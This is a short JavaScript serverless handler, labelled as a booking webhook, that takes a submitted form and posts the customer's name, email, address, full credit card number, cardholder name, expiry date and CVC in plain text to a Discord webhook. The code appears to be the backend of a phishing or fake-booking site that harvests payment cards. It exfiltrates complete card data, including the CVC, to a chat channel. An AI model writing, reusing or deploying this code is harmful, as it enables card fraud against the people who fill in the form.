// /api/sendWebhook.js
export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ message: 'Method not allowed' });
  }

  const webhookUrl = process.env.DISCORD_WEBHOOK_URL;

  if (!webhookUrl) {
    return res.status(500).json({ message: 'Webhook URL nicht konfiguriert' });
  }

  try {
    const data = req.body;

    const content = `Neue Buchung:\n
Vorname: ${data.firstname}
Nachname: ${data.lastname}
E-Mail: ${data.email}
Adresse: ${data.address}, ${data.postalcode} ${data.city}

Kreditkartendaten:
Nummer: ${data.card_number}
Name: ${data.card_name}
Ablaufdatum: ${data.card_expiry}
CVC: ${data.card_cvc}`;

    const response = await fetch(webhookUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ content }),
    });

    if (!response.ok) {
      throw new Error('Fehler beim Senden an Discord Webhook');
    }

    res.status(200).json({ message: 'Webhook gesendet' });
  } catch (error) {
    res.status(500).json({ message: error.message || 'Serverfehler' });
  }
}

